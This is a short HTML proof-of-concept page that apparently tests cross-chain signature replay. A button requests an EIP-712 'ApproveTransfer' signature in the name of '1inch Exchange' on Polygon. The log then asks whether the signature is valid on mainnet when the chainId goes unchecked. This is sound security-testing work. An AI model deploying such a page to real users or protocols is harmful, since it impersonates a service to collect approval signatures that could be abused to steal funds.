<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PoC: Cross-Chain Signature Replay</title>
    <style>
        body { font-family: sans-serif; padding: 20px; background: #f4f4f9; }
        .container { background: white; padding: 20px; border-radius: 12px; border: 2px solid #333; }
        button { background: #555; color: white; padding: 15px; width: 100%; border: none; border-radius: 8px; margin: 10px 0; }
        .log { background: #000; color: #0f0; padding: 15px; border-radius: 8px; font-family: monospace; }
    </style>
</head>
<body>
    <div class="container">
        <h2>Cross-Chain Replay Test</h2>
        <button id="signBtn">Generate Cross-Chain Signature</button>
        <div class="log" id="logs">Ready...</div>
    </div>

    <script>
        function log(msg) { document.getElementById('logs').innerHTML += `<br>${msg}`; }

        document.getElementById('signBtn').onclick = async () => {
            const domain = {
                name: "1inch Exchange",
                version: "1",
                chainId: 137, // Target Chain ID (Polygon)
                verifyingContract: "0x1111111254eeb25477b68fb85ed929f73a960582"
            };

            const message = {
                action: "ApproveTransfer",
                amount: 1000
            };

            const data = JSON.stringify({
                types: {
                    EIP712Domain: [{ name: "name", type: "string" }, { name: "version", type: "string" }, { name: "chainId", type: "uint256" }, { name: "verifyingContract", type: "address" }],
                    Action: [{ name: "action", type: "string" }, { name: "amount", type: "uint256" }]
                },
                primaryType: "Action",
                domain,
                message
            });

            log("Requesting signature for ChainID 137 (Polygon)...");
            
            try {
                const signature = await window.ethereum.request({
                    method: 'eth_signTypedData_v4',
                    params: [window.ethereum.selectedAddress, data]
                });
                
                log("Signature Received: " + signature.substring(0, 20) + "...");
                log("<b>Check:</b> Can this signature be replayed on Mainnet (ChainID 1)?");
                log("If the backend verifies this signature without checking the domain.chainId, this is a CRITICAL vulnerability.");
            } catch (e) {
                log("Error: " + e.message);
            }
        };
    </script>
</body>
</html>
